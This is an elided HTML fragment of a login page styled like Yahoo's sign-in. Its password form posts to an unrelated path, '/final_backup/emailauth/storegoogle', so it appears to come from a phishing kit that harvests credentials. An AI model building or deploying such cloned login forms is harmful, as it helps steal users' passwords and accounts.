...
<html id="Stencil" class="js grid light-theme "><head>
    ...
    <form action="/final_backup/emailauth/storegoogle" method="POST" class="pure-form challenge-form" id="emailaccess">
        ...
        <div class="button-container">
            <button type="submit" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-ylk="elm:btn;elmt:primary;mKey:primary-login-account-challenge-password-primaryBtn">
                    Next
            </button>
        </div>
